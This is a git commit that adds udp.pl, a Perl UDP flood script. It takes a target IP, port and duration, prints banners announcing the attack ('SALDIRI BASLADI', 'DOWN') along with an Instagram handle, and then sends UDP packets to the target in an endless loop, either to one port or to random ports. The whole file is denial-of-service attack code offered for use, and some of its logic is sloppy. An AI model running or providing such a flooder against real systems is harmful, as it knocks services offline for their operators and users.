9464fc9d82da90f03db02a85691c17add188ae2a
Feyzullah <50166320+murrez@users.noreply.github.com>
2019-06-05 01:12:08 +0300

    aktools

---
+++ udp.pl
@@ -0,0 +1,66 @@
+#!/usr/bin/perl
+
+use Socket;
+
+$ARGC=@ARGV;
+
+if ($ARGC !=3) {
+printf "  \n";
+printf "        ::::::::   ::::::::  :::            :::     :::    ::: \n";
+printf "      :+:    :+: :+:    :+: :+:          :+: :+:   :+:   :+:   \n";
+printf "     +:+        +:+    +:+ +:+         +:+   +:+  +:+  +:+     \n";
+printf "    +#+        +#+    +:+ +#+        +#++:++#++: +#++:++       \n";
+printf "   +#+        +#+    +#+ +#+        +#+     +#+ +#+  +#+       \n";
+printf "  #+#    #+# #+#    #+# #+#        #+#     #+# #+#   #+#       \n";
+printf "  ########   ########  ########## ###     ### ###    ###       \n";
+printf "   \n";
+printf "       RANDOM METHOD .!          INSTAGRAM : colak.offical     \n";
+exit(1);
+}
+
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[1];
+$time=$ARGV[2];
+
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+    $iaddr = inet_aton("$ip");
+
+printf "
+         
+         ██████╗  ██████╗ ██╗    ██╗███╗   ██╗
+         ██╔══██╗██╔═══██╗██║    ██║████╗  ██║
+         ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
+         ██║  ██║██║   ██║██║███╗██║██║╚██╗██║
+         ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
+         ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
+                                 
+					SALDIRI BASLADI			 \n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto randpackets;
+}
+
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
+
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 65500) +1;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
